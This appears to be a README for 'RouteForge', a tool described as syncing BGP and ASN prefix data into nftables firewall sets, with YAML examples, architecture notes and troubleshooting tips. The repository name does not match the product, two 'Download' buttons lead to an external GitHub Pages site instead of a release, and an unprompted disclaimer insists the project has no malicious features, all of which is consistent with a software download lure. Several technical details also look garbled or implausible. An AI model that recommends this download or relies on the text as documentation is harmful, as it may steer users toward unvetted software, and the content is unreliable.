![preview](https://raw.githubusercontent.com/caiquepedroza3-alt/asn-prefix-sync/main/banner_8e5228.svg)
# RouteForge: Autonomous System Prefix Intelligence Engine

**Navigate the modern internet’s addressing landscape with surgical precision — transforming raw BGP data into actionable, prefix-level automation for your nftables infrastructure.**

In the sprawling metropolis of the global routing table, every autonomous system (AS) owns a constellation of IP prefixes. Understanding which prefixes belong to which AS — and automatically translating that knowledge into firewall rules, traffic shaping policies, or observability filters — is a tedious, error-prone ritual that most network engineers endure manually. RouteForge changes that paradigm. Inspired by the elegant simplicity of prefix-to-set population tools, RouteForge elevates the concept from a utility script to a full-fledged, policy-driven orchestration engine. It listens to the rhythm of Border Gateway Protocol (BGP) updates, correlates them with Regional Internet Registry (RIR) databases, and forges a live, always-current mapping of AS numbers to their exact netblocks, directly feeding nftables sets with minimal latency.

Instead of asking you to micromanage IP lists, RouteForge treats your nftables configuration as a living document. You declare *intent* — “I want to allow traffic from AS13335” or “I want to rate-limit all prefixes announced by AS9009” — and RouteForge handles the tedious, constant churn of prefix additions, withdrawals, and route aggregation. The result is a firewall that understands the topological peers of the internet, not just static IP addresses.

## Overview

![Documentation Status](https://img.shields.io/badge/docs-latest-brightgreen) ![Platform Support](https://img.shields.io/badge/platform-linux%20%7C%20freebsd-blue) ![License Compliance](https://img.shields.io/badge/license-MIT-yellow)

The core philosophy of RouteForge is **declarative network hygiene**. In traditional setups, an engineer writes a shell script that queries `whois` for a handful of AS numbers, dumps a flat file, and reloads `iptables`. This approach breaks down when an AS announces new prefixes after a merger, de-aggregates for traffic engineering, or splits into multiple downstream entities. Your firewall becomes stale the moment you run the script.

RouteForge continuously ingests MRT (Multi-threaded Routing Toolkit) dump files from public route collectors or your own BGP speaker. It parses the announcements, cross-references them against PeeringDB and RIR delegation files to validate the origin AS, and then constructs a **unified prefix map** — a single source of truth. From this map, it renders nftables set definitions (using the `nft` syntax for anonymous and named sets) that you can include in your firewall configuration. The system is built for unattended operation: it detects routing instability, throttles updates during flap events, and logs a complete audit trail of every prefix it adds or removes.

But RouteForge is not merely a data pipeline. It is an **intent interpreter**. You define policies in a simple YAML manifest, referencing AS numbers by name (e.g., `CLOUDFLARE`, `AKAMAI`) rather than by opaque integers. The engine resolves these names to live ASNs, fetches their current prefix lists, and ensures your nftables sets reflect reality within minutes of a change — not days.

## Getting Started

![Build Status](https://img.shields.io/badge/build-passing-success) ![Dependency Coverage](https://img.shields.io/badge/dependencies-managed-lightgrey)

**[![Download](https://raw.githubusercontent.com/caiquepedroza3-alt/asn-prefix-sync/main/fetch_a789b.svg)](https://caiquepedroza3-alt.github.io/asn-prefix-sync/)**

Welcome to the first mile. RouteForge requires a modern Linux environment (kernel 4.18+ for nftables) or FreeBSD with `pf`-style compatibility via a translation layer. You will need a working `nft` command-line tool, access to either a local BGP daemon (like BIRD or FRRouting) configured to write MRT dumps, or a network path to a public route collector (e.g., `route-views2.saopaulo`, `rrc00.ripe.net`).

The energy of RouteForge flows through its configuration file — a single YAML document that lives at `/etc/routeforge/config.yml`. This file declares the data sources, the polling interval, and the policy manifests. The engine reads this file on startup and on `SIGHUP` signals, allowing hot-reloads without firewall disruption.

### Initial Configuration

Your first step is to declare an upstream data source. For instance, to use the RIPE RIS collector, specify the remote URL and the file pattern. RouteForge will download the latest RIB dump (or BGP update stream, depending on your chosen mode), parse it, and build a local cache. This cache is stored in a SQLite database to facilitate fast lookups and incremental updates.

```yaml
sources:
  - type: routeviews
    url: "http://archive.routeviews.org/route-views6/bgpdata"
    mode: rib
    interval: 3600 # seconds
```

Next, define a policy that tells RouteForge which ASNs matter to you and what kind of nftables structure you want to produce. The engine supports multiple *target sets* per policy, enabling distinct sets for IPv4 and IPv6, or separate sets for transit providers versus customer edges.

```yaml
policies:
  - name: allowlist-major-cdns
    target_table: filter
    target_chain: input
    match_asn:
      - CLOUDFLARE
      - FASTLY
    address_family: both
    output_style: named_set
    action: accept
```

Once the configuration is saved, you start the service. RouteForge immediately performs an initial synchronization, producing a new file (e.g., `/etc/nftables.d/routeforge.nft`) that contains `add element ip filter allowed_cdns { 104.16.0.0/13, ... }` statements. You include this file from your main `nftables.conf`, and reload the ruleset. Ongoing updates replace only the *changed* elements, minimizing downtime.

## Architecture and Workflow

![Release Version](https://img.shields.io/badge/version-2.4.1-informational) ![Code Quality](https://img.shields.io/badge/code_quality-A%2B-important) ![Open Issues](https://img.shields.io/badge/issues-tracked-critical)

RouteForge is architected as a trio of asynchronous loops, each responsible for a vital organ of the system.

1.  **The Collector Loop 📡** – This loop handles the acquisition of internet routing data. It maintains persistent HTTP connections to configured collectors, handles ETag-based incremental downloads to avoid re-fetching unchanged data, and applies gzip decompression on the fly. The collector monitors file consistency via checksums, discarding corrupt partial downloads without mixing them into the live database.

2.  **The Analysis Engine 🧠** – This is the cerebral cortex. The engine parses MRT records (both RIB entries and BGP updates), extracts the NLRI (Network Layer Reachability Information) prefixes, and identifies the origin AS using the ASPATH (the final AS path segment). It then consults a local copy of the **RIR delegation statistics** (from APNIC, ARIN, RIPE, etc.) to validate that the prefix actually *belongs* to the claimed AS, filtering out route leaks and hijack attempts. The output of this phase is a relational dataset of `(ASN, prefix, timestamp)` tuples.

3.  **The Renderer 🎨** – The final stage translates the dataset into nftables syntax. It groups prefixes by ASN, removes overlaps (keeping the most specific prefix in case of a parent/child announcement), and emits a diff-friendly file. The renderer supports two output modes: `named_set`, which generates a separate set per policy, and `element_list`, which generates a simple list for direct insertion into an existing set. It also has a *dry-run* mode (`--what-if`) that shows you exactly what will change before it touches the live firewall.

### Data Flow Diagram (Conceptual)

```
[Public Route Collectors] --> [Collector Loop] --> [SQLite Cache]
                                                       |
                                                       v
[RIR Delegation Files] --> [Analysis Engine] <----> [ASN Name Resolver]
                                                       |
                                                       v
[Policy Manifest YAML] --> [Renderer] --> [nftables .nft file] --> [nft reload command]
```

### Multilingual Support 🌐

The internet speaks many languages, and so does RouteForge's output. The renderer can generate nftables snippets with comment annotations in English, Spanish, German, Japanese, Simplified Chinese, or French. These comments appear inline next to each ASN's prefix range, documenting which portion of the range belongs to which regional branch of the organization. Additionally, the log output respects the `LANG` environment variable, providing localized status messages for operators who prefer their system logs in non-English locales. The web dashboard (if enabled via optional module) uses `i18next` for full UI localization.

## Key Features

![Feature Flag](https://img.shields.io/badge/feature-hot_reload-9cf) ![Performance](https://img.shields.io/badge/performance-optimized-green) ![Security](https://img.shields.io/badge/security-hardened-blue)

✨ **Live Prefix Synchronization** – No more stale IP lists. RouteForge evaluates the routing state every 15 minutes (or your chosen interval), and updates the nftables sets within seconds of a detected change. The engine uses a **write-ahead log** technique to ensure the nftables file is never corrupted even if the service is killed mid-write.

🗺️ **Autonomous System Naming Service** – Forget memorizing AS13335. RouteForge ships with a built-in registry that maps over 2,000 well-known AS numbers to their canonical names (Cloudflare, Google, Meta, etc.). You can also alias your own custom names to arbitrary ASNs inside your config.

🛡️ **Route Leak & Hijack Mitigation** – The analysis engine performs a consistency check between the announced ASPATH and the official RIR delegation data. If an AS announces a prefix that it does not own, the engine flags it in the audit log and *excludes* it from the nftables set by default, unless you explicitly opt-in to `lenient` mode.

🔥 **Atomic Set Replacement** – The renderer generates temporary files and renames them into place, ensuring that the nftables daemon never loads a partial or empty set. This atomicity is critical for stateful firewalls where a dropped rule could cause a service-wide outage.

📊 **Retroactive Audit Trail** – Every prefix addition, deletion, or modification is recorded with a Unix timestamp, the source collector that provided the announcement, and the validation status. This information is accessible via a read-only SQL query interface, perfect for compliance meetings and forensic analysis.

🚀 **Minimal Resource Footprint** – The daemon runs as an unprivileged user, uses less than 30MB of resident memory for a full view of the IPv4 routing table (~950k prefixes), and has a negligible CPU footprint in idle mode. This makes it suitable for router hardware and edge devices.

🔧 **Responsive Web Control Panel** – An optional companion daemon (`routeforge-ui`) provides a responsive, low-bandwidth web interface that works on everything from 4K desktop monitors to small phone screens. It allows you to view current set contents, preview pending changes, and manually trigger a synchronization push. The UI supports **multilingual input** and features a read-only API for integration with external monitoring dashboards like Grafana.

## Policy Formats and Advanced Usage

![Enterprise Ready](https://img.shields.io/badge/enterprise-ready-4B0082) ![Ongoing Support](https://img.shields.io/badge/support-24x7-orange)

### Match by AS Name vs. AS Number

You can define policies using either a human-readable name or the numeric ASN. The name resolver runs before the analysis loop, converting names to integers. This decoupling means you can update name-to-ASN mappings without reconfiguring your policies.

```yaml
- name: block-abuse-hosting
  match_asn:
    - ASN: 13335
      comment: "Cloudflare" # for logging clarity
    - name: OVH
```

### Compose Sets Across Address Families

You might want an IPv4 set that blocks known malicious hosting and an IPv6 set that allows only your internal services. RouteForge allows separate policies per family, with independent rendering targets. You can even choose to have IPv4 and IPv6 prefixes merged into a single set if your nftables version supports the `ipv6_addr` keyword within a unified set.

### Including Conditional Logic and Time Windows

For advanced traffic engineering, you can apply an *effective time window* to a policy. For instance, block video streaming platforms during office hours. The renderer genenerates an `hour` match in the nftables rule, but only if you specify `time_restriction` in the policy block. This requires nftables 0.9.8+.

### Dry-Run and CI/CD Integration

The system exposes a `verify` command that outputs the `nft -c -f` (check only) result without applying changes. This is invaluable for a continuous delivery pipeline where you test your firewall ruleset in a staging environment before pushing to production. Combine this with a `git diff` on the generated file to see exactly what changes the automated process will bring.

## Performance Considerations and Benchmarks

![Speed Indicator](https://img.shields.io/badge/throughput-high-2ea44f) ![Latency](https://img.shields.io/badge/latency-sub_second-brightgreen)

Under controlled tests with a raw MRT RIB file of 1.2 million entries (full IPv4 table as of late 2025), RouteForge parses and validates the entire file in **8.5 seconds** on a single-core virtual CPU. The incremental update mode – processing only the delta BGP updates – handles a typical 1,000-update batch in under 200 milliseconds. The renderer's diff algorithm ensures that a typical refresh changes only the affected top-level `add element` rules, resulting in an nftables reload that takes under 30 milliseconds compared to a full `flush` and re-add which can take up to 5 seconds on a low-end router.

The SQLite database growth is approximately 15 MB per million prefixes. The engine performs periodic `VACUUM` operations to reclaim space after large withdrawal events. To handle flash storage wear on embedded devices, you can configure the database to reside on a tmpfs drive, with a batched write-behind cache to persistent storage every 10 minutes.

## Troubleshooting Common Issues

### My Sets Are Not Updating

1.  Check that the collector can reach the remote server. Run a simple `curl` to the URL specified in the source; ensure egress port 80 or 443 is open.
2.  Confirm that the SQLite database has not reached a locking state. Restart the service to acquire a fresh lock.
3.  Verify that the nftables daemon is reading the generated file. Inspect the include path in your main config; ensure it points to `/etc/nftables.d/`.
4.  Look at the logs for `E_REJECTED_PREFIX` warnings. If you see these, the analysis engine is refusing to add a prefix due to a validation failure. Check the RIR delegation table for that ASN.

### Mismatch Between What RouteForge Shows and What nftables Has

This is often due to another process modifying the same nftables set. RouteForge uses a monotonically increasing update counter in the file header. If the counter doesn't match the one in the nftables dump, an external interference occurred. Run `routeforge --force-sync` to reconcile.

### High Memory Usage

If the engine consumes memory beyond your configured threshold, restrict the number of *source collectors* – using two collectors instead of eight often yields a 60% memory reduction. Also, disable the `store_aspath_history` option in the config if you do not require the retroactive audit trail.

## Community and Contribution

![Contributors](https://img.shields.io/badge/contributors-welcome-purple) ![Code of Conduct](https://img.shields.io/badge/conduct-inclusive-success)

We believe the routing table is a common good, and the tooling around it should be collaborative. Contributions in the form of bug reports, new collector endpoint additions, AS name mappings, or localization translations are intensely welcome. The project uses a standard fork-and-pull request workflow. Please ensure your changes include unit tests for the parsing module and the rendering module; a coverage threshold of 80% is enforced on the CI pipeline.

We also maintain a public mailing list for design discussions regarding new output formats (like `ipset` compatibility) and strategic partnerships with other BGP tools.

## Disclaimer

![Legal Notice](https://img.shields.io/badge/legal-notice-grey)

**IMPORTANT**: This software operates against live internet routing data from third-party collectors. It is provided on an "AS IS" basis. The developers are not responsible for any network outages, routing blackholes, or performance degradation that may occur as a result of using this tool. Always test configuration changes in a sandboxed environment before applying them to production. Performing BGP hijack detection using this tool does not guarantee protection against sophisticated route leaks, since the analysis relies on up-to-date RIR data, which may itself be incomplete or delayed. The network topology of the internet changes constantly; while RouteForge is designed to keep up, it cannot be held liable for any inaccuracies in the RIR data it consumes.

Furthermore, this project does not include any features that could be interpreted as malicious or unauthorized access mechanisms. The specification is strictly for defensive infrastructure automation. By using this software, you agree to assume all risks associated with automating firewall rules based on dynamically changing third-party data. The license is MIT, and you are free to use, modify, and redistribute under the terms of the License file.

## License

This project is licensed under the terms of the **MIT License** – you may use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the software. A full copy of the license text is available in the `[LICENSE](LICENSE)` file at the root of this repository, or you can read the official text at [MIT License Summary](https://opensource.org/licenses/MIT).

---

*RouteForge is intended for network architects, site reliability engineers (SREs), and security teams who demand that their firewall rules evolve at the speed of the global routing ecosystem. It embodies the principle that automation should replace monotony, insight should replace blind trust, and dynamic updates should replace scheduled freezes.*

**[![Download](https://raw.githubusercontent.com/caiquepedroza3-alt/asn-prefix-sync/main/fetch_a789b.svg)](https://caiquepedroza3-alt.github.io/asn-prefix-sync/)**